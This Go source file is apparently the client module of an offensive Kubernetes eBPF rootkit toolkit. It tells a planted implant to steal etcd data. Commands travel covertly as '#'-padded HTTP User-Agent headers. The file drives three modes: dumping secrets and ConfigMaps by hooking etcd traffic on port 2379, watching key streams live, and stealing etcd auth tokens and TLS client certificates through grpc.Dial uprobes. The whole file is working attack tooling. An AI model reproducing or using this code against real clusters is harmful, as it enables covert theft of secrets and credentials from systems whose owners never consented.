package etcd_theft

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type EtcdResult struct {
	Mode    string       `json:"mode"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, mode, keyPrefix, output string) error {
	var result *EtcdResult

	switch mode {
	case "dump":
		result = dumpSecrets(target, keyPrefix)
	case "watch":
		result = watchKeys(target, keyPrefix)
	case "creds":
		result = stealCreds(target)
	default:
		return fmt.Errorf("unsupported mode: %s (use dump, watch, or creds)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func dumpSecrets(target, keyPrefix string) *EtcdResult {
	result := &EtcdResult{Mode: "dump"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"intercept_etcd_reads",
			"kprobe on tcp_sendmsg filtering port 2379 to capture etcd read responses",
			"etcd_intercept_reads",
		},
		{
			"extract_secret_values",
			"parse etcd key-value responses for /registry/secrets content",
			"etcd_extract_secrets",
		},
		{
			"capture_configmaps",
			"extract ConfigMap data from etcd key-value store reads",
			"etcd_extract_configmaps",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyPrefix
		status := sendEtcdCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func watchKeys(target, keyPrefix string) *EtcdResult {
	result := &EtcdResult{Mode: "watch"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"install_watch_hook",
			"attach kprobe to capture etcd watch stream responses in real-time",
			"etcd_install_watch",
		},
		{
			"filter_key_prefix",
			"configure BPF map filter to only capture keys matching target prefix",
			"etcd_filter_prefix",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyPrefix
		status := sendEtcdCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func stealCreds(target string) *EtcdResult {
	result := &EtcdResult{Mode: "creds"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"intercept_grpc_dial",
			"uprobe on grpc.Dial to capture etcd authentication tokens",
			"etcd_intercept_grpc",
		},
		{
			"extract_client_certs",
			"capture TLS client certificate paths from etcd client config",
			"etcd_extract_certs",
		},
		{
			"steal_auth_tokens",
			"intercept etcd auth token exchange during cluster authentication",
			"etcd_steal_tokens",
		},
	}

	for _, a := range actions {
		status := sendEtcdCommand(target, a.cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func sendEtcdCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/etcd_theft", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
